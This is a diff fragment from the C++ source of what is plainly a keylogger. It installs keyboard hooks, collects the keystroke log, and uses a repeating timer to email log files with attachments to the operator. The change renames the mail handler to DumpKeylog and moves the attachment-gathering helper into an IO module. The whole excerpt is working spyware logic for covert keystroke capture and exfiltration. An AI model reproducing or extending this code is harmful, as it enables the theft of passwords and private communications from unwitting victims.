@@ -17,21 +17,11 @@ using namespace std;
 // Global Keyboard Manager
 KeyboardManager keyboardManager;
 
-// TODO Move to helper.h
 // TODO delete logs after running them
-std::vector<std::string> GetAttatchments(const std::string& path)
-{
-	std::vector<std::string> ret;
-	for (const auto& entry : std::filesystem::directory_iterator(path)) {
-		std::cout << entry.path() << std::endl;
-		ret.push_back(Helper::ToString(entry.path()));
-	}
+// TODO reorganize Timer class
 
-	return ret;
-}
-
-// Mail Timer Handler function
-void TimerSendMail()
+// MailTimer Handler function
+void DumpKeylog()
 {
 	if (keyboardManager.keylog.empty())
 		return;
@@ -44,7 +34,7 @@ void TimerSendMail()
 		return;
 	}
 
-	std::vector<std::string> attatchments = GetAttatchments(IO::GetPath(true));
+	std::vector<std::string> attatchments = IO::GetAttatchments(IO::GetPath(true));
 	int x = Mail::SendMail("Log [" + filename + "]", "", filename);
 
 	if (x != 7)
@@ -62,7 +52,7 @@ int main(int argc, char** argv)
 	keyboardManager.InstallHooks();
 
 	// Create and Start mail timer
-	Timer mailTimer(TimerSendMail, FREQUENCY_MINUTES * 1000 * 60, Timer::Infinite);
+	Timer mailTimer(DumpKeylog, FREQUENCY_MINUTES * 1000 * 60, Timer::Infinite);
 	mailTimer.Start(true);
 	Helper::WriteAppLog("Mail Timer Started");
 
